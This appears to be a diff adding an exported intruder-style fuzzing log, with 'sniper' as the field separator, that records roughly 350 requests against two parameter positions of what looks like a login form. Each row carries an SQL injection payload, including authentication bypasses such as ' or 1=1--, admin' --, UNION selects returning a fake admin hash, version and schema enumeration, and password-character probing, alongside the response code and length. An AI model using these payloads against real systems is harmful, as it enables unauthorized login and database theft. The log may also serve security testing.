@@ -1,0 +1,398 @@
+RequestsniperPositionsniperPayloadsniperStatus codesniperErrorsniperTimeoutsniperLengthsniperComment
+0sniper0snipersniper302sniperfalsesniperfalsesniper1640sniper
+1sniper1sniper'-'sniper302sniperfalsesniperfalsesniper1640sniper
+2sniper1sniper' 'sniper302sniperfalsesniperfalsesniper1640sniper
+3sniper1sniper'&'sniper302sniperfalsesniperfalsesniper1640sniper
+4sniper1sniper'^'sniper302sniperfalsesniperfalsesniper1640sniper
+5sniper1sniper'*'sniper302sniperfalsesniperfalsesniper1640sniper
+6sniper1sniper' or ''-'sniper302sniperfalsesniperfalsesniper1640sniper
+7sniper1sniper' or '' 'sniper302sniperfalsesniperfalsesniper1640sniper
+8sniper1sniper' or ''&'sniper302sniperfalsesniperfalsesniper1640sniper
+9sniper1sniper' or ''^'sniper302sniperfalsesniperfalsesniper1640sniper
+10sniper1sniper' or ''*'sniper302sniperfalsesniperfalsesniper1640sniper
+11sniper1sniper"-"sniper302sniperfalsesniperfalsesniper1640sniper
+12sniper1sniper" "sniper302sniperfalsesniperfalsesniper1640sniper
+13sniper1sniper"&"sniper302sniperfalsesniperfalsesniper1640sniper
+14sniper1sniper"^"sniper302sniperfalsesniperfalsesniper1640sniper
+15sniper1sniper"*"sniper302sniperfalsesniperfalsesniper1640sniper
+16sniper1sniper" or ""-"sniper302sniperfalsesniperfalsesniper1640sniper
+17sniper1sniper" or "" "sniper302sniperfalsesniperfalsesniper1640sniper
+18sniper1sniper" or ""&"sniper302sniperfalsesniperfalsesniper1640sniper
+19sniper1sniper" or ""^"sniper302sniperfalsesniperfalsesniper1640sniper
+20sniper1sniper" or ""*"sniper302sniperfalsesniperfalsesniper1640sniper
+21sniper1sniperor true--sniper302sniperfalsesniperfalsesniper1640sniper
+22sniper1sniper" or true--sniper302sniperfalsesniperfalsesniper1640sniper
+23sniper1sniper' or true--sniper302sniperfalsesniperfalsesniper1640sniper
+24sniper1sniper") or true--sniper302sniperfalsesniperfalsesniper1640sniper
+25sniper1sniper') or true--sniper302sniperfalsesniperfalsesniper1640sniper
+26sniper1sniper' or 'x'='xsniper302sniperfalsesniperfalsesniper1640sniper
+27sniper1sniper') or ('x')=('xsniper302sniperfalsesniperfalsesniper1640sniper
+28sniper1sniper')) or (('x'))=(('xsniper302sniperfalsesniperfalsesniper1640sniper
+29sniper1sniper" or "x"="xsniper302sniperfalsesniperfalsesniper1640sniper
+30sniper1sniper") or ("x")=("xsniper302sniperfalsesniperfalsesniper1640sniper
+31sniper1sniper")) or (("x"))=(("xsniper302sniperfalsesniperfalsesniper1640sniper
+32sniper1sniperor 1=1sniper302sniperfalsesniperfalsesniper1640sniper
+33sniper1sniperor 1=1--sniper302sniperfalsesniperfalsesniper1640sniper
+34sniper1sniperor 1=1#sniper302sniperfalsesniperfalsesniper1640sniper
+35sniper1sniperor 1=1/*sniper302sniperfalsesniperfalsesniper1640sniper
+36sniper1sniperadmin' --sniper302sniperfalsesniperfalsesniper1640sniper
+37sniper1sniperadmin' #sniper302sniperfalsesniperfalsesniper1640sniper
+38sniper1sniperadmin'/*sniper302sniperfalsesniperfalsesniper1640sniper
+39sniper1sniperadmin' or '1'='1sniper302sniperfalsesniperfalsesniper1640sniper
+40sniper1sniperadmin' or '1'='1'--sniper302sniperfalsesniperfalsesniper1640sniper
+41sniper1sniperadmin' or '1'='1'#sniper302sniperfalsesniperfalsesniper1640sniper
+42sniper1sniperadmin' or '1'='1'/*sniper302sniperfalsesniperfalsesniper1640sniper
+43sniper1sniperadmin'or 1=1 or ''='sniper302sniperfalsesniperfalsesniper1640sniper
+44sniper1sniperadmin' or 1=1sniper302sniperfalsesniperfalsesniper1640sniper
+45sniper1sniperadmin' or 1=1--sniper302sniperfalsesniperfalsesniper1640sniper
+46sniper1sniperadmin' or 1=1#sniper302sniperfalsesniperfalsesniper1640sniper
+47sniper1sniperadmin' or 1=1/*sniper302sniperfalsesniperfalsesniper1640sniper
+48sniper1sniperadmin') or ('1'='1sniper302sniperfalsesniperfalsesniper1640sniper
+49sniper1sniperadmin') or ('1'='1'--sniper302sniperfalsesniperfalsesniper1640sniper
+50sniper1sniperadmin') or ('1'='1'#sniper302sniperfalsesniperfalsesniper1640sniper
+51sniper1sniperadmin') or ('1'='1'/*sniper302sniperfalsesniperfalsesniper1640sniper
+52sniper1sniperadmin') or '1'='1sniper302sniperfalsesniperfalsesniper1640sniper
+53sniper1sniperadmin') or '1'='1'--sniper302sniperfalsesniperfalsesniper1640sniper
+54sniper1sniperadmin') or '1'='1'#sniper302sniperfalsesniperfalsesniper1640sniper
+55sniper1sniperadmin') or '1'='1'/*sniper302sniperfalsesniperfalsesniper1640sniper
+56sniper1sniper1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055sniper302sniperfalsesniperfalsesniper1640sniper
+57sniper1sniperadmin" --sniper302sniperfalsesniperfalsesniper1640sniper
+58sniper1sniperadmin" #sniper302sniperfalsesniperfalsesniper1640sniper
+59sniper1sniperadmin"/*sniper302sniperfalsesniperfalsesniper1640sniper
+60sniper1sniperadmin" or "1"="1sniper302sniperfalsesniperfalsesniper1640sniper
+61sniper1sniperadmin" or "1"="1"--sniper302sniperfalsesniperfalsesniper1640sniper
+62sniper1sniperadmin" or "1"="1"#sniper302sniperfalsesniperfalsesniper1640sniper
+63sniper1sniperadmin" or "1"="1"/*sniper302sniperfalsesniperfalsesniper1640sniper
+64sniper1sniperadmin"or 1=1 or ""="sniper302sniperfalsesniperfalsesniper1640sniper
+65sniper1sniperadmin" or 1=1sniper302sniperfalsesniperfalsesniper1640sniper
+66sniper1sniperadmin" or 1=1--sniper302sniperfalsesniperfalsesniper1640sniper
+67sniper1sniperadmin" or 1=1#sniper302sniperfalsesniperfalsesniper1640sniper
+68sniper1sniperadmin" or 1=1/*sniper302sniperfalsesniperfalsesniper1640sniper
+69sniper1sniperadmin") or ("1"="1sniper302sniperfalsesniperfalsesniper1640sniper
+70sniper1sniperadmin") or ("1"="1"--sniper302sniperfalsesniperfalsesniper1640sniper
+71sniper1sniperadmin") or ("1"="1"#sniper302sniperfalsesniperfalsesniper1640sniper
+72sniper1sniperadmin") or ("1"="1"/*sniper302sniperfalsesniperfalsesniper1640sniper
+73sniper1sniperadmin") or "1"="1sniper302sniperfalsesniperfalsesniper1640sniper
+74sniper1sniperadmin") or "1"="1"--sniper302sniperfalsesniperfalsesniper1640sniper
+75sniper1sniperadmin") or "1"="1"#sniper302sniperfalsesniperfalsesniper1640sniper
+76sniper1sniperadmin") or "1"="1"/*sniper302sniperfalsesniperfalsesniper1640sniper
+77sniper1sniper1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055sniper302sniperfalsesniperfalsesniper1640sniper
+78sniper1sniper==sniper302sniperfalsesniperfalsesniper1640sniper
+79sniper1sniper=sniper302sniperfalsesniperfalsesniper1640sniper
+80sniper1sniper'sniper302sniperfalsesniperfalsesniper1640sniper
+81sniper1sniper' --sniper302sniperfalsesniperfalsesniper1640sniper
+82sniper1sniper' #sniper302sniperfalsesniperfalsesniper1640sniper
+83sniper1sniper' –sniper302sniperfalsesniperfalsesniper1640sniper
+84sniper1sniper'--sniper302sniperfalsesniperfalsesniper1640sniper
+85sniper1sniper'/*sniper302sniperfalsesniperfalsesniper1640sniper
+86sniper1sniper'#sniper302sniperfalsesniperfalsesniper1640sniper
+87sniper1sniper" --sniper302sniperfalsesniperfalsesniper1640sniper
+88sniper1sniper" #sniper302sniperfalsesniperfalsesniper1640sniper
+89sniper1sniper"/*sniper302sniperfalsesniperfalsesniper1640sniper
+90sniper1sniper' and 1='1sniper302sniperfalsesniperfalsesniper1640sniper
+91sniper1sniper' and a='asniper302sniperfalsesniperfalsesniper1640sniper
+92sniper1sniper or 1=1sniper302sniperfalsesniperfalsesniper1640sniper
+93sniper1sniper or truesniper302sniperfalsesniperfalsesniper1640sniper
+94sniper1sniper' or ''='sniper302sniperfalsesniperfalsesniper1640sniper
+95sniper1sniper" or ""="sniper302sniperfalsesniperfalsesniper1640sniper
+96sniper1sniper1′) and '1′='1–sniper302sniperfalsesniperfalsesniper1640sniper
+97sniper1sniper' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055sniper302sniperfalsesniperfalsesniper1640sniper
+98sniper1sniper" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055sniper302sniperfalsesniperfalsesniper1640sniper
+99sniper1sniper and 1=1sniper302sniperfalsesniperfalsesniper1640sniper
+100sniper1sniper and 1=1–sniper302sniperfalsesniperfalsesniper1640sniper
+101sniper1sniper' and 'one'='onesniper302sniperfalsesniperfalsesniper1640sniper
+102sniper1sniper' and 'one'='one–sniper302sniperfalsesniperfalsesniper1640sniper
+103sniper1sniper' group by password having 1=1--sniper302sniperfalsesniperfalsesniper1640sniper
+104sniper1sniper' group by userid having 1=1--sniper302sniperfalsesniperfalsesniper1640sniper
+105sniper1sniper' group by username having 1=1--sniper302sniperfalsesniperfalsesniper1640sniper
+106sniper1sniper like '%'sniper302sniperfalsesniperfalsesniper1640sniper
+107sniper1sniper or 0=0 --sniper302sniperfalsesniperfalsesniper1640sniper
+108sniper1sniper or 0=0 #sniper302sniperfalsesniperfalsesniper1640sniper
+109sniper1sniper or 0=0 –sniper302sniperfalsesniperfalsesniper1640sniper
+110sniper1sniper' or         0=0 #sniper302sniperfalsesniperfalsesniper1640sniper
+111sniper1sniper' or 0=0 --sniper302sniperfalsesniperfalsesniper1640sniper
+112sniper1sniper' or 0=0 #sniper302sniperfalsesniperfalsesniper1640sniper
+113sniper1sniper' or 0=0 –sniper302sniperfalsesniperfalsesniper1640sniper
+114sniper1sniper" or 0=0 --sniper302sniperfalsesniperfalsesniper1640sniper
+115sniper1sniper" or 0=0 #sniper302sniperfalsesniperfalsesniper1640sniper
+116sniper1sniper" or 0=0 –sniper302sniperfalsesniperfalsesniper1640sniper
+117sniper1sniper%' or '0'='0sniper302sniperfalsesniperfalsesniper1640sniper
+118sniper1sniper or 1=1sniper302sniperfalsesniperfalsesniper1640sniper
+119sniper1sniper or 1=1--sniper302sniperfalsesniperfalsesniper1640sniper
+120sniper1sniper or 1=1/*sniper302sniperfalsesniperfalsesniper1640sniper
+121sniper1sniper or 1=1#sniper302sniperfalsesniperfalsesniper1640sniper
+122sniper1sniper or 1=1–sniper302sniperfalsesniperfalsesniper1640sniper
+123sniper1sniper' or 1=1--sniper302sniperfalsesniperfalsesniper1640sniper
+124sniper1sniper' or '1'='1sniper302sniperfalsesniperfalsesniper1640sniper
+125sniper1sniper' or '1'='1'--sniper302sniperfalsesniperfalsesniper1640sniper
+126sniper1sniper' or '1'='1'/*sniper302sniperfalsesniperfalsesniper1640sniper
+127sniper1sniper' or '1'='1'#sniper302sniperfalsesniperfalsesniper1640sniper
+128sniper1sniper' or '1′='1sniper302sniperfalsesniperfalsesniper1640sniper
+129sniper1sniper' or 1=1sniper302sniperfalsesniperfalsesniper1640sniper
+130sniper1sniper' or 1=1 --sniper302sniperfalsesniperfalsesniper1640sniper
+131sniper1sniper' or 1=1 –sniper302sniperfalsesniperfalsesniper1640sniper
+132sniper1sniper' or 1=1--sniper302sniperfalsesniperfalsesniper1640sniper
+133sniper1sniper' or 1=1;#sniper302sniperfalsesniperfalsesniper1640sniper
+134sniper1sniper' or 1=1/*sniper302sniperfalsesniperfalsesniper1640sniper
+135sniper1sniper' or 1=1#sniper302sniperfalsesniperfalsesniper1640sniper
+136sniper1sniper' or 1=1–sniper302sniperfalsesniperfalsesniper1640sniper
+137sniper1sniper') or '1'='1sniper302sniperfalsesniperfalsesniper1640sniper
+138sniper1sniper') or '1'='1--sniper302sniperfalsesniperfalsesniper1640sniper
+139sniper1sniper') or '1'='1'--sniper302sniperfalsesniperfalsesniper1640sniper
+140sniper1sniper') or '1'='1'/*sniper302sniperfalsesniperfalsesniper1640sniper
+141sniper1sniper') or '1'='1'#sniper302sniperfalsesniperfalsesniper1640sniper
+142sniper1sniper') or ('1'='1sniper302sniperfalsesniperfalsesniper1640sniper
+143sniper1sniper') or ('1'='1--sniper302sniperfalsesniperfalsesniper1640sniper
+144sniper1sniper') or ('1'='1'--sniper302sniperfalsesniperfalsesniper1640sniper
+145sniper1sniper') or ('1'='1'/*sniper302sniperfalsesniperfalsesniper1640sniper
+146sniper1sniper') or ('1'='1'#sniper302sniperfalsesniperfalsesniper1640sniper
+147sniper1sniper'or'1=1sniper302sniperfalsesniperfalsesniper1640sniper
+148sniper1sniper'or'1=1′sniper302sniperfalsesniperfalsesniper1640sniper
+149sniper1sniper" or "1"="1sniper302sniperfalsesniperfalsesniper1640sniper
+150sniper1sniper" or "1"="1"--sniper302sniperfalsesniperfalsesniper1640sniper
+151sniper1sniper" or "1"="1"/*sniper302sniperfalsesniperfalsesniper1640sniper
+152sniper1sniper" or "1"="1"#sniper302sniperfalsesniperfalsesniper1640sniper
+153sniper1sniper" or 1=1sniper302sniperfalsesniperfalsesniper1640sniper
+154sniper1sniper" or 1=1 --sniper302sniperfalsesniperfalsesniper1640sniper
+155sniper1sniper" or 1=1 –sniper302sniperfalsesniperfalsesniper1640sniper
+156sniper1sniper" or 1=1--sniper302sniperfalsesniperfalsesniper1640sniper
+157sniper1sniper" or 1=1/*sniper302sniperfalsesniperfalsesniper1640sniper
+158sniper1sniper" or 1=1#sniper302sniperfalsesniperfalsesniper1640sniper
+159sniper1sniper" or 1=1–sniper302sniperfalsesniperfalsesniper1640sniper
+160sniper1sniper") or "1"="1sniper302sniperfalsesniperfalsesniper1640sniper
+161sniper1sniper") or "1"="1"--sniper302sniperfalsesniperfalsesniper1640sniper
+162sniper1sniper") or "1"="1"/*sniper302sniperfalsesniperfalsesniper1640sniper
+163sniper1sniper") or "1"="1"#sniper302sniperfalsesniperfalsesniper1640sniper
+164sniper1sniper") or ("1"="1sniper302sniperfalsesniperfalsesniper1640sniper
+165sniper1sniper") or ("1"="1"--sniper302sniperfalsesniperfalsesniper1640sniper
+166sniper1sniper") or ("1"="1"/*sniper302sniperfalsesniperfalsesniper1640sniper
+167sniper1sniper") or ("1"="1"#sniper302sniperfalsesniperfalsesniper1640sniper
+168sniper1sniper) or '1′='1–sniper302sniperfalsesniperfalsesniper1640sniper
+169sniper1sniper) or ('1′='1–sniper302sniperfalsesniperfalsesniper1640sniper
+170sniper1sniper' or 1=1 LIMIT 1;#sniper302sniperfalsesniperfalsesniper1640sniper
+171sniper1sniper'or 1=1 or ''='sniper302sniperfalsesniperfalsesniper1640sniper
+172sniper1sniper"or 1=1 or ""="sniper302sniperfalsesniperfalsesniper1640sniper
+173sniper1sniper' or 'a'='asniper302sniperfalsesniperfalsesniper1640sniper
+174sniper1sniper' or a=a--sniper302sniperfalsesniperfalsesniper1640sniper
+175sniper1sniper' or a=a–sniper302sniperfalsesniperfalsesniper1640sniper
+176sniper1sniper') or ('a'='asniper302sniperfalsesniperfalsesniper1640sniper
+177sniper1sniper" or "a"="asniper302sniperfalsesniperfalsesniper1640sniper
+178sniper1sniper") or ("a"="asniper302sniperfalsesniperfalsesniper1640sniper
+179sniper1sniper') or ('a'='a and hi") or ("a"="asniper302sniperfalsesniperfalsesniper1640sniper
+180sniper1sniper' or 'one'='onesniper302sniperfalsesniperfalsesniper1640sniper
+181sniper1sniper' or 'one'='one–sniper302sniperfalsesniperfalsesniper1640sniper
+182sniper1sniper' or uid like '%sniper302sniperfalsesniperfalsesniper1640sniper
+183sniper1sniper' or uname like '%sniper302sniperfalsesniperfalsesniper1640sniper
+184sniper1sniper' or userid like '%sniper302sniperfalsesniperfalsesniper1640sniper
+185sniper1sniper' or user like '%sniper302sniperfalsesniperfalsesniper1640sniper
+186sniper1sniper' or username like '%sniper302sniperfalsesniperfalsesniper1640sniper
+187sniper1sniper' or 'x'='xsniper302sniperfalsesniperfalsesniper1640sniper
+188sniper1sniper') or ('x'='xsniper302sniperfalsesniperfalsesniper1640sniper
+189sniper1sniper" or "x"="xsniper302sniperfalsesniperfalsesniper1640sniper
+190sniper1sniper' OR 'x'='x'#;sniper302sniperfalsesniperfalsesniper1640sniper
+191sniper1sniper'=' 'or' and '=' 'or'sniper302sniperfalsesniperfalsesniper1640sniper
+192sniper1sniper' UNION ALL SELECT 1, @@version;#sniper302sniperfalsesniperfalsesniper1640sniper
+193sniper1sniper' UNION ALL SELECT system_user(),user();#sniper302sniperfalsesniperfalsesniper1640sniper
+194sniper1sniper' UNION select table_schema,table_name FROM information_Schema.tables;#sniper302sniperfalsesniperfalsesniper1640sniper
+195sniper1sniperadmin' and substring(password/text(),1,1)='7sniper302sniperfalsesniperfalsesniper1640sniper
+196sniper1sniper' and substring(password/text(),1,1)='7sniper302sniperfalsesniperfalsesniper1640sniper
+197sniper1sniper' or 1=1 limit 1 -- -+sniper302sniperfalsesniperfalsesniper1640sniper
+198sniper1sniper'="or'sniper302sniperfalsesniperfalsesniper1640sniper
+199sniper2sniper'-'sniper302sniperfalsesniperfalsesniper1640sniper
+200sniper2sniper' 'sniper302sniperfalsesniperfalsesniper1640sniper
+201sniper2sniper'&'sniper302sniperfalsesniperfalsesniper1640sniper
+202sniper2sniper'^'sniper302sniperfalsesniperfalsesniper1640sniper
+203sniper2sniper'*'sniper302sniperfalsesniperfalsesniper1640sniper
+204sniper2sniper' or ''-'sniper302sniperfalsesniperfalsesniper1640sniper
+205sniper2sniper' or '' 'sniper302sniperfalsesniperfalsesniper1640sniper
+206sniper2sniper' or ''&'sniper302sniperfalsesniperfalsesniper1640sniper
+207sniper2sniper' or ''^'sniper302sniperfalsesniperfalsesniper1640sniper
+208sniper2sniper' or ''*'sniper302sniperfalsesniperfalsesniper1640sniper
+209sniper2sniper"-"sniper302sniperfalsesniperfalsesniper1640sniper
+210sniper2sniper" "sniper302sniperfalsesniperfalsesniper1640sniper
+211sniper2sniper"&"sniper302sniperfalsesniperfalsesniper1640sniper
+212sniper2sniper"^"sniper302sniperfalsesniperfalsesniper1640sniper
+213sniper2sniper"*"sniper302sniperfalsesniperfalsesniper1640sniper
+214sniper2sniper" or ""-"sniper302sniperfalsesniperfalsesniper1640sniper
+215sniper2sniper" or "" "sniper302sniperfalsesniperfalsesniper1640sniper
+216sniper2sniper" or ""&"sniper302sniperfalsesniperfalsesniper1640sniper
+217sniper2sniper" or ""^"sniper302sniperfalsesniperfalsesniper1640sniper
+218sniper2sniper" or ""*"sniper302sniperfalsesniperfalsesniper1640sniper
+219sniper2sniperor true--sniper302sniperfalsesniperfalsesniper1640sniper
+220sniper2sniper" or true--sniper302sniperfalsesniperfalsesniper1640sniper
+221sniper2sniper' or true--sniper302sniperfalsesniperfalsesniper1640sniper
+222sniper2sniper") or true--sniper302sniperfalsesniperfalsesniper1640sniper
+223sniper2sniper') or true--sniper302sniperfalsesniperfalsesniper1640sniper
+224sniper2sniper' or 'x'='xsniper302sniperfalsesniperfalsesniper1640sniper
+225sniper2sniper') or ('x')=('xsniper302sniperfalsesniperfalsesniper1640sniper
+226sniper2sniper')) or (('x'))=(('xsniper302sniperfalsesniperfalsesniper1640sniper
+227sniper2sniper" or "x"="xsniper302sniperfalsesniperfalsesniper1640sniper
+228sniper2sniper") or ("x")=("xsniper302sniperfalsesniperfalsesniper1640sniper
+229sniper2sniper")) or (("x"))=(("xsniper302sniperfalsesniperfalsesniper1640sniper
+230sniper2sniperor 1=1sniper302sniperfalsesniperfalsesniper1640sniper
+231sniper2sniperor 1=1--sniper302sniperfalsesniperfalsesniper1640sniper
+232sniper2sniperor 1=1#sniper302sniperfalsesniperfalsesniper1640sniper
+233sniper2sniperor 1=1/*sniper302sniperfalsesniperfalsesniper1640sniper
+234sniper2sniperadmin' --sniper302sniperfalsesniperfalsesniper1640sniper
+235sniper2sniperadmin' #sniper302sniperfalsesniperfalsesniper1640sniper
+236sniper2sniperadmin'/*sniper302sniperfalsesniperfalsesniper1640sniper
+237sniper2sniperadmin' or '1'='1sniper302sniperfalsesniperfalsesniper1640sniper
+238sniper2sniperadmin' or '1'='1'--sniper302sniperfalsesniperfalsesniper1640sniper
+239sniper2sniperadmin' or '1'='1'#sniper302sniperfalsesniperfalsesniper1640sniper
+240sniper2sniperadmin' or '1'='1'/*sniper302sniperfalsesniperfalsesniper1640sniper
+241sniper2sniperadmin'or 1=1 or ''='sniper302sniperfalsesniperfalsesniper1640sniper
+242sniper2sniperadmin' or 1=1sniper302sniperfalsesniperfalsesniper1640sniper
+243sniper2sniperadmin' or 1=1--sniper302sniperfalsesniperfalsesniper1640sniper
+244sniper2sniperadmin' or 1=1#sniper302sniperfalsesniperfalsesniper1640sniper
+245sniper2sniperadmin' or 1=1/*sniper302sniperfalsesniperfalsesniper1640sniper
+246sniper2sniperadmin') or ('1'='1sniper302sniperfalsesniperfalsesniper1640sniper
+247sniper2sniperadmin') or ('1'='1'--sniper302sniperfalsesniperfalsesniper1640sniper
+248sniper2sniperadmin') or ('1'='1'#sniper302sniperfalsesniperfalsesniper1640sniper
+249sniper2sniperadmin') or ('1'='1'/*sniper302sniperfalsesniperfalsesniper1640sniper
+250sniper2sniperadmin') or '1'='1sniper302sniperfalsesniperfalsesniper1640sniper
+251sniper2sniperadmin') or '1'='1'--sniper302sniperfalsesniperfalsesniper1640sniper
+252sniper2sniperadmin') or '1'='1'#sniper302sniperfalsesniperfalsesniper1640sniper
+253sniper2sniperadmin') or '1'='1'/*sniper302sniperfalsesniperfalsesniper1640sniper
+254sniper2sniper1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055sniper302sniperfalsesniperfalsesniper1640sniper
+255sniper2sniperadmin" --sniper302sniperfalsesniperfalsesniper1640sniper
+256sniper2sniperadmin" #sniper302sniperfalsesniperfalsesniper1640sniper
+257sniper2sniperadmin"/*sniper302sniperfalsesniperfalsesniper1640sniper
+258sniper2sniperadmin" or "1"="1sniper302sniperfalsesniperfalsesniper1640sniper
+259sniper2sniperadmin" or "1"="1"--sniper302sniperfalsesniperfalsesniper1640sniper
+260sniper2sniperadmin" or "1"="1"#sniper302sniperfalsesniperfalsesniper1640sniper
+261sniper2sniperadmin" or "1"="1"/*sniper302sniperfalsesniperfalsesniper1640sniper
+262sniper2sniperadmin"or 1=1 or ""="sniper302sniperfalsesniperfalsesniper1640sniper
+263sniper2sniperadmin" or 1=1sniper302sniperfalsesniperfalsesniper1640sniper
+264sniper2sniperadmin" or 1=1--sniper302sniperfalsesniperfalsesniper1640sniper
+265sniper2sniperadmin" or 1=1#sniper302sniperfalsesniperfalsesniper1640sniper
+266sniper2sniperadmin" or 1=1/*sniper302sniperfalsesniperfalsesniper1640sniper
+267sniper2sniperadmin") or ("1"="1sniper302sniperfalsesniperfalsesniper1640sniper
+268sniper2sniperadmin") or ("1"="1"--sniper302sniperfalsesniperfalsesniper1640sniper
+269sniper2sniperadmin") or ("1"="1"#sniper302sniperfalsesniperfalsesniper1640sniper
+270sniper2sniperadmin") or ("1"="1"/*sniper302sniperfalsesniperfalsesniper1640sniper
+271sniper2sniperadmin") or "1"="1sniper302sniperfalsesniperfalsesniper1640sniper
+272sniper2sniperadmin") or "1"="1"--sniper302sniperfalsesniperfalsesniper1640sniper
+273sniper2sniperadmin") or "1"="1"#sniper302sniperfalsesniperfalsesniper1640sniper
+274sniper2sniperadmin") or "1"="1"/*sniper302sniperfalsesniperfalsesniper1640sniper
+275sniper2sniper1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055sniper302sniperfalsesniperfalsesniper1640sniper
+276sniper2sniper==sniper302sniperfalsesniperfalsesniper1640sniper
+277sniper2sniper=sniper302sniperfalsesniperfalsesniper1640sniper
+278sniper2sniper'sniper302sniperfalsesniperfalsesniper1640sniper
+279sniper2sniper' --sniper302sniperfalsesniperfalsesniper1640sniper
+280sniper2sniper' #sniper302sniperfalsesniperfalsesniper1640sniper
+281sniper2sniper' –sniper302sniperfalsesniperfalsesniper1640sniper
+282sniper2sniper'--sniper302sniperfalsesniperfalsesniper1640sniper
+283sniper2sniper'/*sniper302sniperfalsesniperfalsesniper1640sniper
+284sniper2sniper'#sniper302sniperfalsesniperfalsesniper1640sniper
+285sniper2sniper" --sniper302sniperfalsesniperfalsesniper1640sniper
+286sniper2sniper" #sniper302sniperfalsesniperfalsesniper1640sniper
+287sniper2sniper"/*sniper302sniperfalsesniperfalsesniper1640sniper
+288sniper2sniper' and 1='1sniper302sniperfalsesniperfalsesniper1640sniper
+289sniper2sniper' and a='asniper302sniperfalsesniperfalsesniper1640sniper
+290sniper2sniper or 1=1sniper302sniperfalsesniperfalsesniper1640sniper
+291sniper2sniper or truesniper302sniperfalsesniperfalsesniper1640sniper
+292sniper2sniper' or ''='sniper302sniperfalsesniperfalsesniper1640sniper
+293sniper2sniper" or ""="sniper302sniperfalsesniperfalsesniper1640sniper
+294sniper2sniper1′) and '1′='1–sniper302sniperfalsesniperfalsesniper1640sniper
+295sniper2sniper' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055sniper302sniperfalsesniperfalsesniper1640sniper
+296sniper2sniper" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055sniper302sniperfalsesniperfalsesniper1640sniper
+297sniper2sniper and 1=1sniper302sniperfalsesniperfalsesniper1640sniper
+298sniper2sniper and 1=1–sniper302sniperfalsesniperfalsesniper1640sniper
+299sniper2sniper' and 'one'='onesniper302sniperfalsesniperfalsesniper1640sniper
+300sniper2sniper' and 'one'='one–sniper302sniperfalsesniperfalsesniper1640sniper
+301sniper2sniper' group by password having 1=1--sniper302sniperfalsesniperfalsesniper1640sniper
+302sniper2sniper' group by userid having 1=1--sniper302sniperfalsesniperfalsesniper1640sniper
+303sniper2sniper' group by username having 1=1--sniper302sniperfalsesniperfalsesniper1640sniper
+304sniper2sniper like '%'sniper302sniperfalsesniperfalsesniper1640sniper
+305sniper2sniper or 0=0 --sniper302sniperfalsesniperfalsesniper1640sniper
+306sniper2sniper or 0=0 #sniper302sniperfalsesniperfalsesniper1640sniper
+307sniper2sniper or 0=0 –sniper302sniperfalsesniperfalsesniper1640sniper
+308sniper2sniper' or         0=0 #sniper302sniperfalsesniperfalsesniper1640sniper
+309sniper2sniper' or 0=0 --sniper302sniperfalsesniperfalsesniper1640sniper
+310sniper2sniper' or 0=0 #sniper302sniperfalsesniperfalsesniper1640sniper
+311sniper2sniper' or 0=0 –sniper302sniperfalsesniperfalsesniper1640sniper
+312sniper2sniper" or 0=0 --sniper302sniperfalsesniperfalsesniper1640sniper
+313sniper2sniper" or 0=0 #sniper302sniperfalsesniperfalsesniper1640sniper
+314sniper2sniper" or 0=0 –sniper302sniperfalsesniperfalsesniper1640sniper
+315sniper2sniper%' or '0'='0sniper302sniperfalsesniperfalsesniper1640sniper
+316sniper2sniper or 1=1sniper302sniperfalsesniperfalsesniper1640sniper
+317sniper2sniper or 1=1--sniper302sniperfalsesniperfalsesniper1640sniper
+318sniper2sniper or 1=1/*sniper302sniperfalsesniperfalsesniper1640sniper
+319sniper2sniper or 1=1#sniper302sniperfalsesniperfalsesniper1640sniper
+320sniper2sniper or 1=1–sniper302sniperfalsesniperfalsesniper1640sniper
+321sniper2sniper' or 1=1--sniper302sniperfalsesniperfalsesniper1640sniper
+322sniper2sniper' or '1'='1sniper302sniperfalsesniperfalsesniper1640sniper
+323sniper2sniper' or '1'='1'--sniper302sniperfalsesniperfalsesniper1640sniper
+324sniper2sniper' or '1'='1'/*sniper302sniperfalsesniperfalsesniper1640sniper
+325sniper2sniper' or '1'='1'#sniper302sniperfalsesniperfalsesniper1640sniper
+326sniper2sniper' or '1′='1sniper302sniperfalsesniperfalsesniper1640sniper
+327sniper2sniper' or 1=1sniper302sniperfalsesniperfalsesniper1640sniper
+328sniper2sniper' or 1=1 --sniper302sniperfalsesniperfalsesniper1640sniper
+329sniper2sniper' or 1=1 –sniper302sniperfalsesniperfalsesniper1640sniper
+330sniper2sniper' or 1=1--sniper302sniperfalsesniperfalsesniper1640sniper
+331sniper2sniper' or 1=1;#sniper302sniperfalsesniperfalsesniper1640sniper
+332sniper2sniper' or 1=1/*sniper302sniperfalsesniperfalsesniper1640sniper
+333sniper2sniper' or 1=1#sniper302sniperfalsesniperfalsesniper1640sniper
+334sniper2sniper' or 1=1–sniper302sniperfalsesniperfalsesniper1640sniper
+335sniper2sniper') or '1'='1sniper302sniperfalsesniperfalsesniper1640sniper
+336sniper2sniper') or '1'='1--sniper302sniperfalsesniperfalsesniper1640sniper
+337sniper2sniper') or '1'='1'--sniper302sniperfalsesniperfalsesniper1640sniper
+338sniper2sniper') or '1'='1'/*sniper302sniperfalsesniperfalsesniper1640sniper
+339sniper2sniper') or '1'='1'#sniper302sniperfalsesniperfalsesniper1640sniper
+340sniper2sniper') or ('1'='1sniper302sniperfalsesniperfalsesniper1640sniper
+341sniper2sniper') or ('1'='1--sniper302sniperfalsesniperfalsesniper1640sniper
+342sniper2sniper') or ('1'='1'--sniper302sniperfalsesniperfalsesniper1640sniper
+343sniper2sniper') or ('1'='1'/*sniper302sniperfalsesniperfalsesniper1640sniper
+344sniper2sniper') or ('1'='1'#sniper302sniperfalsesniperfalsesniper1640sniper
+345sniper2sniper'or'1=1sniper302sniperfalsesniperfalsesniper1640sniper
+346sniper2sniper'or'1=1′sniper302sniperfalsesniperfalsesniper1640sniper
+347sniper2sniper" or "1"="1sniper302sniperfalsesniperfalsesniper1640sniper
+348sniper2sniper" or "1"="1"--sniper302sniperfalsesniperfalsesniper1640sniper
+349sniper2sniper" or "1"="1"/*sniper302sniperfalsesniperfalsesniper1640sniper
